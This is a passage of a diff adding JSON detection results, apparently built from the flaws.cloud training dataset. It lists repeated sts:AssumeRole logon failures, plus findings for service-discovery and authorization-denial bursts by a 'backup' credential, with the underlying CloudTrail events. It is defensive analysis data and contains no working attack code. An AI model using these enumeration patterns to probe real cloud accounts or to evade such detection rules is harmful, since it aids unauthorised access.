+     "summary": "failure logon [Unknown] from 255.253.125.115 reason=User: arn:aws:iam::811596193553:user/SecurityMokey is not authorized to perform: sts:AssumeRole on resource: arn:aws:iam::811596193553:role/SecurityMonkey"
+    },
+    "cloudtrail-logon-002662": {
+     "timestamp": "2017-05-26 22:25:11+00:00",
+     "device": "aws:811596193553/us-east-1",
+     "actor": "SecurityMokey",
+     "event_type": "logon",
+     "summary": "failure logon [Unknown] from 255.253.125.115 reason=User: arn:aws:iam::811596193553:user/SecurityMokey is not authorized to perform: sts:AssumeRole on resource: arn:aws:iam::811596193553:role/SecurityMonkey"
+    },
+    "cloudtrail-logon-002663": {
+     "timestamp": "2017-05-26 22:25:11+00:00",
+     "device": "aws:811596193553/us-east-1",
+     "actor": "SecurityMokey",
+     "event_type": "logon",
+     "summary": "failure logon [Unknown] from 255.253.125.115 reason=User: arn:aws:iam::811596193553:user/SecurityMokey is not authorized to perform: sts:AssumeRole on resource: arn:aws:iam::811596193553:role/SecurityMonkey"
+    },
+    "cloudtrail-logon-002664": {
+     "timestamp": "2017-05-26 22:25:11+00:00",
+     "device": "aws:811596193553/us-east-1",
+     "actor": "SecurityMokey",
+     "event_type": "logon",
+     "summary": "failure logon [Unknown] from 255.253.125.115 reason=User: arn:aws:iam::811596193553:user/SecurityMokey is not authorized to perform: sts:AssumeRole on resource: arn:aws:iam::811596193553:role/SecurityMonkey"
+    },
+    "cloudtrail-logon-002665": {
+     "timestamp": "2017-05-26 22:25:11+00:00",
+     "device": "aws:811596193553/us-east-1",
+     "actor": "SecurityMokey",
+     "event_type": "logon",
+     "summary": "failure logon [Unknown] from 255.253.125.115 reason=User: arn:aws:iam::811596193553:user/SecurityMokey is not authorized to perform: sts:AssumeRole on resource: arn:aws:iam::811596193553:role/SecurityMonkey"
+    },
+    "cloudtrail-logon-002666": {
+     "timestamp": "2017-05-26 22:25:12+00:00",
+     "device": "aws:811596193553/us-east-1",
+     "actor": "SecurityMokey",
+     "event_type": "logon",
+     "summary": "failure logon [Unknown] from 255.253.125.115 reason=User: arn:aws:iam::811596193553:user/SecurityMokey is not authorized to perform: sts:AssumeRole on resource: arn:aws:iam::811596193553:role/SecurityMonkey"
+    },
+    "cloudtrail-logon-002667": {
+     "timestamp": "2017-05-26 22:25:12+00:00",
+     "device": "aws:811596193553/us-east-1",
+     "actor": "SecurityMokey",
+     "event_type": "logon",
+     "summary": "failure logon [Unknown] from 255.253.125.115 reason=User: arn:aws:iam::811596193553:user/SecurityMokey is not authorized to perform: sts:AssumeRole on resource: arn:aws:iam::811596193553:role/SecurityMonkey"
+    },
+    "cloudtrail-logon-002668": {
+     "timestamp": "2017-05-26 22:25:12+00:00",
+     "device": "aws:811596193553/us-east-1",
+     "actor": "SecurityMokey",
+     "event_type": "logon",
+     "summary": "failure logon [Unknown] from 255.253.125.115 reason=User: arn:aws:iam::811596193553:user/SecurityMokey is not authorized to perform: sts:AssumeRole on resource: arn:aws:iam::811596193553:role/SecurityMonkey"
+    },
+    "cloudtrail-logon-002669": {
+     "timestamp": "2017-05-26 22:25:13+00:00",
+     "device": "aws:811596193553/us-east-1",
+     "actor": "SecurityMokey",
+     "event_type": "logon",
+     "summary": "failure logon [Unknown] from 255.253.125.115 reason=User: arn:aws:iam::811596193553:user/SecurityMokey is not authorized to perform: sts:AssumeRole on resource: arn:aws:iam::811596193553:role/SecurityMonkey"
+    },
+    "cloudtrail-logon-002670": {
+     "timestamp": "2017-05-26 22:25:13+00:00",
+     "device": "aws:811596193553/us-east-1",
+     "actor": "SecurityMokey",
+     "event_type": "logon",
+     "summary": "failure logon [Unknown] from 255.253.125.115 reason=User: arn:aws:iam::811596193553:user/SecurityMokey is not authorized to perform: sts:AssumeRole on resource: arn:aws:iam::811596193553:role/SecurityMonkey"
+    },
+    "cloudtrail-logon-002671": {
+     "timestamp": "2017-05-26 22:25:13+00:00",
+     "device": "aws:811596193553/us-east-1",
+     "actor": "SecurityMokey",
+     "event_type": "logon",
+     "summary": "failure logon [Unknown] from 255.253.125.115 reason=User: arn:aws:iam::811596193553:user/SecurityMokey is not authorized to perform: sts:AssumeRole on resource: arn:aws:iam::811596193553:role/SecurityMonkey"
+    },
+    "cloudtrail-logon-002672": {
+     "timestamp": "2017-05-26 22:25:14+00:00",
+     "device": "aws:811596193553/us-east-1",
+     "actor": "SecurityMokey",
+     "event_type": "logon",
+     "summary": "failure logon [Unknown] from 255.253.125.115 reason=User: arn:aws:iam::811596193553:user/SecurityMokey is not authorized to perform: sts:AssumeRole on resource: arn:aws:iam::811596193553:role/SecurityMonkey"
+    },
+    "cloudtrail-logon-002673": {
+     "timestamp": "2017-05-26 22:25:14+00:00",
+     "device": "aws:811596193553/us-east-1",
+     "actor": "SecurityMokey",
+     "event_type": "logon",
+     "summary": "failure logon [Unknown] from 255.253.125.115 reason=User: arn:aws:iam::811596193553:user/SecurityMokey is not authorized to perform: sts:AssumeRole on resource: arn:aws:iam::811596193553:role/SecurityMonkey"
+    },
+    "cloudtrail-logon-002674": {
+     "timestamp": "2017-05-26 22:25:14+00:00",
+     "device": "aws:811596193553/us-east-1",
+     "actor": "SecurityMokey",
+     "event_type": "logon",
+     "summary": "failure logon [Unknown] from 255.253.125.115 reason=User: arn:aws:iam::811596193553:user/SecurityMokey is not authorized to perform: sts:AssumeRole on resource: arn:aws:iam::811596193553:role/SecurityMonkey"
+    },
+    "cloudtrail-logon-002675": {
+     "timestamp": "2017-05-26 22:26:48+00:00",
+     "device": "aws:811596193553/us-east-1",
+     "actor": "SecurityMokey",
+     "event_type": "logon",
+     "summary": "success logon [Unknown] from 255.253.125.115"
+    },
+    "cloudtrail-logon-002676": {
+     "timestamp": "2017-05-26 22:26:48+00:00",
+     "device": "aws:811596193553/us-east-1",
+     "actor": "SecurityMokey",
+     "event_type": "logon",
+     "summary": "failure logon [Unknown] from 255.253.125.115 reason=User: arn:aws:iam::811596193553:user/SecurityMokey is not authorized to perform: sts:AssumeRole on resource: arn:aws:iam::811596193553:role/SecurityMonkey"
+    },
+    "cloudtrail-logon-002683": {
+     "timestamp": "2017-05-26 22:26:56+00:00",
+     "device": "aws:811596193553/us-east-1",
+     "actor": "SecurityMokey",
+     "event_type": "logon",
+     "summary": "failure logon [Unknown] from 255.253.125.115 reason=User: arn:aws:iam::811596193553:user/SecurityMokey is not authorized to perform: sts:AssumeRole on resource: arn:aws:iam::811596193553:role/SecurityMonkey"
+    },
+    "cloudtrail-logon-002685": {
+     "timestamp": "2017-05-26 22:26:59+00:00",
+     "device": "aws:811596193553/us-east-1",
+     "actor": "SecurityMokey",
+     "event_type": "logon",
+     "summary": "failure logon [Unknown] from 255.253.125.115 reason=User: arn:aws:iam::811596193553:user/SecurityMokey is not authorized to perform: sts:AssumeRole on resource: arn:aws:iam::811596193553:role/SecurityMonkey"
+    },
+    "cloudtrail-logon-002689": {
+     "timestamp": "2017-05-26 22:27:02+00:00",
+     "device": "aws:811596193553/us-east-1",
+     "actor": "SecurityMokey",
+     "event_type": "logon",
+     "summary": "failure logon [Unknown] from 255.253.125.115 reason=User: arn:aws:iam::811596193553:user/SecurityMokey is not authorized to perform: sts:AssumeRole on resource: arn:aws:iam::811596193553:role/SecurityMonkey"
+    },
+    "cloudtrail-logon-002696": {
+     "timestamp": "2017-05-26 22:27:05+00:00",
+     "device": "aws:811596193553/us-east-1",
+     "actor": "SecurityMokey",
+     "event_type": "logon",
+     "summary": "failure logon [Unknown] from 255.253.125.115 reason=User: arn:aws:iam::811596193553:user/SecurityMokey is not authorized to perform: sts:AssumeRole on resource: arn:aws:iam::811596193553:role/SecurityMonkey"
+    },
+    "cloudtrail-logon-002698": {
+     "timestamp": "2017-05-26 22:27:05+00:00",
+     "device": "aws:811596193553/us-east-1",
+     "actor": "SecurityMokey",
+     "event_type": "logon",
+     "summary": "failure logon [Unknown] from 255.253.125.115 reason=User: arn:aws:iam::811596193553:user/SecurityMokey is not authorized to perform: sts:AssumeRole on resource: arn:aws:iam::811596193553:role/SecurityMonkey"
+    },
+    "cloudtrail-logon-002700": {
+     "timestamp": "2017-05-26 22:27:05+00:00",
+     "device": "aws:811596193553/us-east-1",
+     "actor": "SecurityMokey",
+     "event_type": "logon",
+     "summary": "failure logon [Unknown] from 255.253.125.115 reason=User: arn:aws:iam::811596193553:user/SecurityMokey is not authorized to perform: sts:AssumeRole on resource: arn:aws:iam::811596193553:role/SecurityMonkey"
+    },
+    "cloudtrail-logon-002709": {
+     "timestamp": "2017-05-26 22:27:11+00:00",
+     "device": "aws:811596193553/us-east-1",
+     "actor": "SecurityMokey",
+     "event_type": "logon",
+     "summary": "failure logon [Unknown] from 255.253.125.115 reason=User: arn:aws:iam::811596193553:user/SecurityMokey is not authorized to perform: sts:AssumeRole on resource: arn:aws:iam::811596193553:role/SecurityMonkey"
+    },
+    "cloudtrail-logon-002713": {
+     "timestamp": "2017-05-26 22:27:13+00:00",
+     "device": "aws:811596193553/us-east-1",
+     "actor": "SecurityMokey",
+     "event_type": "logon",
+     "summary": "failure logon [Unknown] from 255.253.125.115 reason=User: arn:aws:iam::811596193553:user/SecurityMokey is not authorized to perform: sts:AssumeRole on resource: arn:aws:iam::811596193553:role/SecurityMonkey"
+    },
+    "cloudtrail-logon-002727": {
+     "timestamp": "2017-05-26 22:27:20+00:00",
+     "device": "aws:811596193553/us-east-1",
+     "actor": "SecurityMokey",
+     "event_type": "logon",
+     "summary": "failure logon [Unknown] from 255.253.125.115 reason=User: arn:aws:iam::811596193553:user/SecurityMokey is not authorized to perform: sts:AssumeRole on resource: arn:aws:iam::811596193553:role/SecurityMonkey"
+    },
+    "cloudtrail-logon-002730": {
+     "timestamp": "2017-05-26 22:27:23+00:00",
+     "device": "aws:811596193553/us-east-1",
+     "actor": "SecurityMokey",
+     "event_type": "logon",
+     "summary": "failure logon [Unknown] from 255.253.125.115 reason=User: arn:aws:iam::811596193553:user/SecurityMokey is not authorized to perform: sts:AssumeRole on resource: arn:aws:iam::811596193553:role/SecurityMonkey"
+    },
+    "cloudtrail-logon-002734": {
+     "timestamp": "2017-05-26 22:27:30+00:00",
+     "device": "aws:811596193553/us-east-1",
+     "actor": "SecurityMokey",
+     "event_type": "logon",
+     "summary": "failure logon [Unknown] from 255.253.125.115 reason=User: arn:aws:iam::811596193553:user/SecurityMokey is not authorized to perform: sts:AssumeRole on resource: arn:aws:iam::811596193553:role/SecurityMonkey"
+    },
+    "cloudtrail-logon-002738": {
+     "timestamp": "2017-05-26 22:27:36+00:00",
+     "device": "aws:811596193553/us-east-1",
+     "actor": "SecurityMokey",
+     "event_type": "logon",
+     "summary": "failure logon [Unknown] from 255.253.125.115 reason=User: arn:aws:iam::811596193553:user/SecurityMokey is not authorized to perform: sts:AssumeRole on resource: arn:aws:iam::811596193553:role/SecurityMonkey"
+    },
+    "cloudtrail-logon-002739": {
+     "timestamp": "2017-05-26 22:27:36+00:00",
+     "device": "aws:811596193553/us-east-1",
+     "actor": "SecurityMokey",
+     "event_type": "logon",
+     "summary": "failure logon [Unknown] from 255.253.125.115 reason=User: arn:aws:iam::811596193553:user/SecurityMokey is not authorized to perform: sts:AssumeRole on resource: arn:aws:iam::811596193553:role/SecurityMonkey"
+    },
+    "cloudtrail-logon-002746": {
+     "timestamp": "2017-05-26 22:27:43+00:00",
+     "device": "aws:811596193553/us-east-1",
+     "actor": "SecurityMokey",
+     "event_type": "logon",
+     "summary": "failure logon [Unknown] from 255.253.125.115 reason=User: arn:aws:iam::811596193553:user/SecurityMokey is not authorized to perform: sts:AssumeRole on resource: arn:aws:iam::811596193553:role/SecurityMonkey"
+    },
+    "cloudtrail-logon-002749": {
+     "timestamp": "2017-05-26 22:27:46+00:00",
+     "device": "aws:811596193553/us-east-1",
+     "actor": "SecurityMokey",
+     "event_type": "logon",
+     "summary": "failure logon [Unknown] from 255.253.125.115 reason=User: arn:aws:iam::811596193553:user/SecurityMokey is not authorized to perform: sts:AssumeRole on resource: arn:aws:iam::811596193553:role/SecurityMonkey"
+    },
+    "cloudtrail-logon-002754": {
+     "timestamp": "2017-05-26 22:27:52+00:00",
+     "device": "aws:811596193553/us-east-1",
+     "actor": "SecurityMokey",
+     "event_type": "logon",
+     "summary": "failure logon [Unknown] from 255.253.125.115 reason=User: arn:aws:iam::811596193553:user/SecurityMokey is not authorized to perform: sts:AssumeRole on resource: arn:aws:iam::811596193553:role/SecurityMonkey"
+    },
+    "cloudtrail-logon-002760": {
+     "timestamp": "2017-05-26 22:27:57+00:00",
+     "device": "aws:811596193553/us-east-1",
+     "actor": "SecurityMokey",
+     "event_type": "logon",
+     "summary": "failure logon [Unknown] from 255.253.125.115 reason=User: arn:aws:iam::811596193553:user/SecurityMokey is not authorized to perform: sts:AssumeRole on resource: arn:aws:iam::811596193553:role/SecurityMonkey"
+    },
+    "cloudtrail-logon-002763": {
+     "timestamp": "2017-05-26 22:27:59+00:00",
+     "device": "aws:811596193553/us-east-1",
+     "actor": "SecurityMokey",
+     "event_type": "logon",
+     "summary": "failure logon [Unknown] from 255.253.125.115 reason=User: arn:aws:iam::811596193553:user/SecurityMokey is not authorized to perform: sts:AssumeRole on resource: arn:aws:iam::811596193553:role/SecurityMonkey"
+    },
+    "cloudtrail-logon-002764": {
+     "timestamp": "2017-05-26 22:28:00+00:00",
+     "device": "aws:811596193553/us-east-1",
+     "actor": "SecurityMokey",
+     "event_type": "logon",
+     "summary": "failure logon [Unknown] from 255.253.125.115 reason=User: arn:aws:iam::811596193553:user/SecurityMokey is not authorized to perform: sts:AssumeRole on resource: arn:aws:iam::811596193553:role/SecurityMonkey"
+    },
+    "cloudtrail-logon-002772": {
+     "timestamp": "2017-05-26 22:28:08+00:00",
+     "device": "aws:811596193553/us-east-1",
+     "actor": "SecurityMokey",
+     "event_type": "logon",
+     "summary": "failure logon [Unknown] from 255.253.125.115 reason=User: arn:aws:iam::811596193553:user/SecurityMokey is not authorized to perform: sts:AssumeRole on resource: arn:aws:iam::811596193553:role/SecurityMonkey"
+    },
+    "cloudtrail-logon-002778": {
+     "timestamp": "2017-05-26 22:28:14+00:00",
+     "device": "aws:811596193553/us-east-1",
+     "actor": "SecurityMokey",
+     "event_type": "logon",
+     "summary": "failure logon [Unknown] from 255.253.125.115 reason=User: arn:aws:iam::811596193553:user/SecurityMokey is not authorized to perform: sts:AssumeRole on resource: arn:aws:iam::811596193553:role/SecurityMonkey"
+    },
+    "cloudtrail-logon-002779": {
+     "timestamp": "2017-05-26 22:28:15+00:00",
+     "device": "aws:811596193553/us-east-1",
+     "actor": "SecurityMokey",
+     "event_type": "logon",
+     "summary": "failure logon [Unknown] from 255.253.125.115 reason=User: arn:aws:iam::811596193553:user/SecurityMokey is not authorized to perform: sts:AssumeRole on resource: arn:aws:iam::811596193553:role/SecurityMonkey"
+    },
+    "cloudtrail-logon-002786": {
+     "timestamp": "2017-05-26 22:28:21+00:00",
+     "device": "aws:811596193553/us-east-1",
+     "actor": "SecurityMokey",
+     "event_type": "logon",
+     "summary": "failure logon [Unknown] from 255.253.125.115 reason=User: arn:aws:iam::811596193553:user/SecurityMokey is not authorized to perform: sts:AssumeRole on resource: arn:aws:iam::811596193553:role/SecurityMonkey"
+    },
+    "cloudtrail-logon-002791": {
+     "timestamp": "2017-05-26 22:28:27+00:00",
+     "device": "aws:811596193553/us-east-1",
+     "actor": "SecurityMokey",
+     "event_type": "logon",
+     "summary": "failure logon [Unknown] from 255.253.125.115 reason=User: arn:aws:iam::811596193553:user/SecurityMokey is not authorized to perform: sts:AssumeRole on resource: arn:aws:iam::811596193553:role/SecurityMonkey"
+    },
+    "cloudtrail-logon-002809": {
+     "timestamp": "2017-05-26 22:29:02+00:00",
+     "device": "aws:811596193553/us-east-1",
+     "actor": "SecurityMokey",
+     "event_type": "logon",
+     "summary": "failure logon [Unknown] from 255.253.125.115 reason=User: arn:aws:iam::811596193553:user/SecurityMokey is not authorized to perform: sts:AssumeRole on resource: arn:aws:iam::811596193553:role/SecurityMonkey"
+    },
+    "cloudtrail-logon-002811": {
+     "timestamp": "2017-05-26 22:29:03+00:00",
+     "device": "aws:811596193553/us-east-1",
+     "actor": "SecurityMokey",
+     "event_type": "logon",
+     "summary": "failure logon [Unknown] from 255.253.125.115 reason=User: arn:aws:iam::811596193553:user/SecurityMokey is not authorized to perform: sts:AssumeRole on resource: arn:aws:iam::811596193553:role/SecurityMonkey"
+    },
+    "cloudtrail-logon-002815": {
+     "timestamp": "2017-05-26 22:29:09+00:00",
+     "device": "aws:811596193553/us-east-1",
+     "actor": "SecurityMokey",
+     "event_type": "logon",
+     "summary": "failure logon [Unknown] from 255.253.125.115 reason=User: arn:aws:iam::811596193553:user/SecurityMokey is not authorized to perform: sts:AssumeRole on resource: arn:aws:iam::811596193553:role/SecurityMonkey"
+    },
+    "cloudtrail-logon-002820": {
+     "timestamp": "2017-05-26 22:29:14+00:00",
+     "device": "aws:811596193553/us-east-1",
+     "actor": "SecurityMokey",
+     "event_type": "logon",
+     "summary": "failure logon [Unknown] from 255.253.125.115 reason=User: arn:aws:iam::811596193553:user/SecurityMokey is not authorized to perform: sts:AssumeRole on resource: arn:aws:iam::811596193553:role/SecurityMonkey"
+    },
+    "cloudtrail-logon-002822": {
+     "timestamp": "2017-05-26 22:29:16+00:00",
+     "device": "aws:811596193553/us-east-1",
+     "actor": "SecurityMokey",
+     "event_type": "logon",
+     "summary": "failure logon [Unknown] from 255.253.125.115 reason=User: arn:aws:iam::811596193553:user/SecurityMokey is not authorized to perform: sts:AssumeRole on resource: arn:aws:iam::811596193553:role/SecurityMonkey"
+    },
+    "cloudtrail-logon-004000": {
+     "timestamp": "2017-05-27 00:08:45+00:00",
+     "device": "aws:811596193553/us-east-1",
+     "actor": "SecurityMokey",
+     "event_type": "logon",
+     "summary": "success logon [Unknown] from 255.253.125.115"
+    },
+    "cloudtrail-logon-005000": {
+     "timestamp": "2017-05-27 02:44:56+00:00",
+     "device": "aws:811596193553/us-east-1",
+     "actor": "SecurityMokey",
+     "event_type": "logon",
+     "summary": "success logon [Unknown] from 255.253.125.115"
+    },
+    "cloudtrail-logon-006000": {
+     "timestamp": "2017-05-27 05:01:14+00:00",
+     "device": "aws:811596193553/us-east-1",
+     "actor": "SecurityMokey",
+     "event_type": "logon",
+     "summary": "success logon [Unknown] from 255.253.125.115"
+    },
+    "cloudtrail-logon-007195": {
+     "timestamp": "2017-05-27 15:15:15+00:00",
+     "device": "aws:811596193553/us-east-1",
+     "actor": "SecurityMokey",
+     "event_type": "logon",
+     "summary": "success logon [Unknown] from 255.253.125.115"
+    }
+   }
+  },
+  {
+   "corpus": "flaws_cloud",
+   "case_id": "CASE-018",
+   "rebuilt": true,
+   "severity": "HIGH",
+   "rule_ids": [
+    "AWS-003"
+   ],
+   "findings": [
+    {
+     "finding_id": "AWS-003:cloudtrail-control-110341",
+     "rule_id": "AWS-003",
+     "title": "Cloud service discovery burst",
+     "severity": "HIGH",
+     "device": "aws:811596193553/us-east-1",
+     "actor": "backup",
+     "reason": "'backup' made 35 read calls across 10 distinct services in 53s, 21 of them refused for want of authority (60%). Breadth with no permission behind it is enumeration rather than administration. The rule counts how many services were read, not which, so it cannot say whether the target was the account's service inventory or its infrastructure.",
+     "event_ids": [
+      "cloudtrail-control-110341",
+      "cloudtrail-control-110344",
+      "cloudtrail-control-110347",
+      "cloudtrail-control-110350",
+      "cloudtrail-control-110351",
+      "cloudtrail-control-110352",
+      "cloudtrail-control-110353",
+      "cloudtrail-control-110355",
+      "cloudtrail-control-110356",
+      "cloudtrail-control-110357"
+     ]
+    }
+   ],
+   "case_evidence_ids": [
+    "cloudtrail-control-110341",
+    "cloudtrail-control-110344",
+    "cloudtrail-control-110347",
+    "cloudtrail-control-110350",
+    "cloudtrail-control-110351",
+    "cloudtrail-control-110352",
+    "cloudtrail-control-110353",
+    "cloudtrail-control-110355",
+    "cloudtrail-control-110356",
+    "cloudtrail-control-110357"
+   ],
+   "finding_ids_match_manifest": true,
+   "evidence_ids_match_manifest": true,
+   "events": {
+    "cloudtrail-control-110341": {
+     "timestamp": "2018-08-02 07:04:50+00:00",
+     "device": "aws:811596193553/us-east-1",
+     "actor": "backup",
+     "event_type": "control",
+     "summary": "backup get iam:account-summary [denied]"
+    },
+    "cloudtrail-control-110344": {
+     "timestamp": "2018-08-02 07:04:52+00:00",
+     "device": "aws:811596193553/us-east-1",
+     "actor": "backup",
+     "event_type": "control",
+     "summary": "backup describe ec2:image [allowed]"
+    },
+    "cloudtrail-control-110347": {
+     "timestamp": "2018-08-02 07:04:56+00:00",
+     "device": "aws:811596193553/us-east-1",
+     "actor": "backup",
+     "event_type": "control",
+     "summary": "backup describe rds:db-instance [denied]"
+    },
+    "cloudtrail-control-110350": {
+     "timestamp": "2018-08-02 07:05:24+00:00",
+     "device": "aws:811596193553/ap-northeast-1",
+     "actor": "backup",
+     "event_type": "control",
+     "summary": "backup list dynamodb:table [denied]"
+    },
+    "cloudtrail-control-110351": {
+     "timestamp": "2018-08-02 07:05:24+00:00",
+     "device": "aws:811596193553/ap-northeast-1",
+     "actor": "backup",
+     "event_type": "control",
+     "summary": "backup list sns:topic [denied]"
+    },
+    "cloudtrail-control-110352": {
+     "timestamp": "2018-08-02 07:05:25+00:00",
+     "device": "aws:811596193553/ap-northeast-1",
+     "actor": "backup",
+     "event_type": "control",
+     "summary": "backup describe elasticbeanstalk:application [allowed]"
+    },
+    "cloudtrail-control-110353": {
+     "timestamp": "2018-08-02 07:05:25+00:00",
+     "device": "aws:811596193553/ap-northeast-1",
+     "actor": "backup",
+     "event_type": "control",
+     "summary": "backup list lambda:function [denied]"
+    },
+    "cloudtrail-control-110355": {
+     "timestamp": "2018-08-02 07:05:25+00:00",
+     "device": "aws:811596193553/ap-northeast-1",
+     "actor": "backup",
+     "event_type": "control",
+     "summary": "backup list s3:bucket [allowed]"
+    },
+    "cloudtrail-control-110356": {
+     "timestamp": "2018-08-02 07:05:25+00:00",
+     "device": "aws:811596193553/ap-northeast-1",
+     "actor": "backup",
+     "event_type": "control",
+     "summary": "backup describe cloudformation:stack [denied]"
+    },
+    "cloudtrail-control-110357": {
+     "timestamp": "2018-08-02 07:05:26+00:00",
+     "device": "aws:811596193553/us-east-1",
+     "actor": "backup",
+     "event_type": "control",
+     "summary": "backup list cloudfront:distribution [denied]"
+    },
+    "cloudtrail-logon-000120": {
+     "timestamp": "2017-02-27 16:58:36+00:00",
+     "device": "aws:811596193553/us-east-1",
+     "actor": "backup",
+     "event_type": "logon",
+     "summary": "success logon [Unknown] from 0.229.250.9"
+    },
+    "cloudtrail-logon-025755": {
+     "timestamp": "2018-09-06 10:47:31+00:00",
+     "device": "aws:811596193553/us-east-1",
+     "actor": "backup",
+     "event_type": "logon",
+     "summary": "failure logon [Unknown] from 1.5.5.223 reason=Not authorized to perform sts:AssumeRole"
+    },
+    "cloudtrail-logon-079340": {
+     "timestamp": "2020-10-06 15:12:58+00:00",
+     "device": "aws:811596193553/us-east-1",
+     "actor": "backup",
+     "event_type": "logon",
+     "summary": "success logon [Unknown] from 0.0.58.4"
+    }
+   }
+  },
+  {
+   "corpus": "flaws_cloud",
+   "case_id": "CASE-050",
+   "rebuilt": true,
+   "severity": "HIGH",
+   "rule_ids": [
+    "AWS-003",
+    "AWS-004"
+   ],
+   "findings": [
+    {
+     "finding_id": "AWS-003:cloudtrail-control-189268",
+     "rule_id": "AWS-003",
+     "title": "Cloud service discovery burst",
+     "severity": "HIGH",
+     "device": "aws:811596193553/us-east-1",
+     "actor": "backup",
+     "reason": "'backup' made 720 read calls across 87 distinct services in 596s, 498 of them refused for want of authority (69%). Breadth with no permission behind it is enumeration rather than administration. The rule counts how many services were read, not which, so it cannot say whether the target was the account's service inventory or its infrastructure.",
+     "event_ids": [
+      "cloudtrail-control-189268",
+      "cloudtrail-control-189271",
+      "cloudtrail-control-189274",
+      "cloudtrail-control-189276",
+      "cloudtrail-control-189278",
+      "cloudtrail-control-189290",
+      "cloudtrail-control-189293",
+      "cloudtrail-control-189312",
+      "cloudtrail-control-189320",
+      "cloudtrail-control-189322",
+      "cloudtrail-control-189323",
+      "cloudtrail-control-189330",
+      "cloudtrail-control-189336",
+      "cloudtrail-control-189350",
+      "cloudtrail-control-189352",
+      "cloudtrail-control-189358",
+      "cloudtrail-control-189359",
+      "cloudtrail-control-189368",
+      "cloudtrail-control-189370",
+      "cloudtrail-control-189378"
+     ]
+    },
+    {
+     "finding_id": "AWS-004:cloudtrail-control-189271",
+     "rule_id": "AWS-004",
+     "title": "Authorization-denial burst",
+     "severity": "HIGH",
+     "device": "aws:811596193553/us-east-1",
+     "actor": "backup",
+     "reason": "'backup' was refused authorization 506 times in 161s, across 245 distinct resource types. Refusals spread across this many kinds of object are consistent with a caller establishing what its credential can reach. A refusal says what the platform would not do; it does not say what the caller intended.",
+     "event_ids": [
+      "cloudtrail-control-189271",
+      "cloudtrail-control-189274",
+      "cloudtrail-control-189276",
+      "cloudtrail-control-189278",
+      "cloudtrail-control-189279",
+      "cloudtrail-control-189280",
+      "cloudtrail-control-189281",
+      "cloudtrail-control-189286",
+      "cloudtrail-control-189287",
+      "cloudtrail-control-189290",
+      "cloudtrail-control-189291",
+      "cloudtrail-control-189292",
+      "cloudtrail-control-189293",
+      "cloudtrail-control-189294",
+      "cloudtrail-control-189300",
+      "cloudtrail-control-189301",
+      "cloudtrail-control-189302",
+      "cloudtrail-control-189303",
+      "cloudtrail-control-189304",
+      "cloudtrail-control-189305"
+     ]
+    }
+   ],
+   "case_evidence_ids": [
+    "cloudtrail-control-189268",
+    "cloudtrail-control-189271",
+    "cloudtrail-control-189274",
+    "cloudtrail-control-189276",
+    "cloudtrail-control-189278",
+    "cloudtrail-control-189279",
+    "cloudtrail-control-189280",
+    "cloudtrail-control-189281",
+    "cloudtrail-control-189286",
+    "cloudtrail-control-189287",
+    "cloudtrail-control-189290",
+    "cloudtrail-control-189291",
+    "cloudtrail-control-189292",
+    "cloudtrail-control-189293",
+    "cloudtrail-control-189294",
+    "cloudtrail-control-189300",
+    "cloudtrail-control-189301",
+    "cloudtrail-control-189302",
+    "cloudtrail-control-189303",
+    "cloudtrail-control-189304",
+    "cloudtrail-control-189305",
+    "cloudtrail-control-189312",
+    "cloudtrail-control-189320",
+    "cloudtrail-control-189322",
+    "cloudtrail-control-189323",
+    "cloudtrail-control-189330",
+    "cloudtrail-control-189336",
+    "cloudtrail-control-189350",
+    "cloudtrail-control-189352",
+    "cloudtrail-control-189358",
+    "cloudtrail-control-189359",
+    "cloudtrail-control-189368",
+    "cloudtrail-control-189370",
+    "cloudtrail-control-189378"
+   ],
+   "finding_ids_match_manifest": true,
+   "evidence_ids_match_manifest": true,
+   "events": {
+    "cloudtrail-control-189268": {
+     "timestamp": "2019-04-05 09:22:11+00:00",
+     "device": "aws:811596193553/us-east-1",
+     "actor": "backup",
+     "event_type": "control",
+     "summary": "backup get sts:caller-identity [allowed]"
+    },
+    "cloudtrail-control-189271": {
+     "timestamp": "2019-04-05 09:22:12+00:00",
+     "device": "aws:811596193553/us-east-1",
+     "actor": "backup",
+     "event_type": "control",
+     "summary": "backup get iam:account-summary [denied]"
+    },
+    "cloudtrail-control-189274": {
+     "timestamp": "2019-04-05 09:22:13+00:00",
+     "device": "aws:811596193553/us-east-1",
+     "actor": "backup",
+     "event_type": "control",
+     "summary": "backup list acm:certificate [denied]"
+    },
+    "cloudtrail-control-189276": {
+     "timestamp": "2019-04-05 09:22:14+00:00",
+     "device": "aws:811596193553/us-east-1",
+     "actor": "backup",
+     "event_type": "control",
+     "summary": "backup list acm-pca:certificate-authority [denied]"
+    },
+    "cloudtrail-control-189278": {
+     "timestamp": "2019-04-05 09:22:15+00:00",
+     "device": "aws:811596193553/us-east-1",
+     "actor": "backup",
+     "event_type": "control",
+     "summary": "backup get apigateway:domain-name [denied]"
+    },
+    "cloudtrail-control-189279": {
+     "timestamp": "2019-04-05 09:22:15+00:00",
+     "device": "aws:811596193553/us-east-1",
+     "actor": "backup",
+     "event_type": "control",
+     "summary": "backup get apigateway:rest-apis [denied]"
+    },
+    "cloudtrail-control-189280": {
+     "timestamp": "2019-04-05 09:22:15+00:00",
+     "device": "aws:811596193553/us-east-1",
+     "actor": "backup",
+     "event_type": "control",
+     "summary": "backup get apigateway:client-certificate [denied]"
+    },
+    "cloudtrail-control-189281": {
+     "timestamp": "2019-04-05 09:22:15+00:00",
+     "device": "aws:811596193553/us-east-1",
+     "actor": "backup",
+     "event_type": "control",
+     "summary": "backup get apigateway:api-key [denied]"
+    },
+    "cloudtrail-control-189286": {
+     "timestamp": "2019-04-05 09:22:16+00:00",
+     "device": "aws:811596193553/us-east-1",
+     "actor": "backup",
+     "event_type": "control",
+     "summary": "backup get apigateway:sdk-type [denied]"
+    },
+    "cloudtrail-control-189287": {
+     "timestamp": "2019-04-05 09:22:16+00:00",
+     "device": "aws:811596193553/us-east-1",
+     "actor": "backup",
+     "event_type": "control",
+     "summary": "backup get apigateway:usage-plan [denied]"
+    },
+    "cloudtrail-control-189290": {
+     "timestamp": "2019-04-05 09:22:19+00:00",
+     "device": "aws:811596193553/us-east-1",
+     "actor": "backup",
+     "event_type": "control",
+     "summary": "backup describe autoscaling:auto-scaling-instance [denied]"
+    },
+    "cloudtrail-control-189291": {
+     "timestamp": "2019-04-05 09:22:19+00:00",
+     "device": "aws:811596193553/us-east-1",
+     "actor": "backup",
+     "event_type": "control",
+     "summary": "backup describe autoscaling:adjustment-type [denied]"
+    },
+    "cloudtrail-control-189292": {
+     "timestamp": "2019-04-05 09:22:19+00:00",
+     "device": "aws:811596193553/us-east-1",
+     "actor": "backup",
+     "event_type": "control",
